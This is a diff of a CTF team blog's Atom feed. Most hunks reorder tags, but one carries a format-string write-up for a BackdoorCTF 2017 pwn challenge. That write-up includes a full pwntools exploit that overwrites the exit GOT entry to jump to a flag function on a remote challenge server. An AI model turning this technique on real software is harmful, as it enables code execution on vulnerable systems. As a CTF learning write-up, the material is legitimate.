@@ -51,7 +51,7 @@
     <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/"/>
     <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/</id>
     <published>2017-09-25T04:46:07.000Z</published>
-    <updated>2017-10-05T02:49:53.282Z</updated>
+    <updated>2017-10-05T02:52:19.667Z</updated>
     
     <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt=""><br></a><br><em>1.1 - format string vulnerability.</em></p>
 <p>We have a format string vulnerability we can confirm this by running the binary:</p>
@@ -73,7 +73,7 @@
 <h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hn'</span></div></pre></td></tr></table></figure>
 <p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
-<p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing, is very cleaver is to split the address in half using some bit operations with this we know exactly which characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
+<p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div></pre></td></tr></table></figure>
 <p>The full exploit:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line"></div><div class="line">r =getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x08048724</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line">binary = ELF(<span class="string">'./32_new'</span>)</div><div class="line">FLAG = <span class="number">0x0804870b</span></div><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">r.sendline(s)</div><div class="line"><span class="keyword">print</span> r.recvall(timeout=<span class="number">1</span>)</div><div class="line">r.close()</div></pre></td></tr></table></figure>
@@ -143,15 +143,15 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
     
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
-    
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -280,11 +280,11 @@
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -321,9 +321,9 @@
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
     
@@ -674,11 +674,11 @@
     
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
+      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
+    
       <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
     
       <category term="sqlinjection" scheme="https://teamrocketist.github.io/tags/sqlinjection/"/>
-    
-      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
     
       <category term="httpauth" scheme="https://teamrocketist.github.io/tags/httpauth/"/>
     
@@ -761,13 +761,13 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
+    
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
       <category term="stackoverflow" scheme="https://teamrocketist.github.io/tags/stackoverflow/"/>
-    
-      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
     
   </entry>
   
@@ -877,11 +877,11 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
     
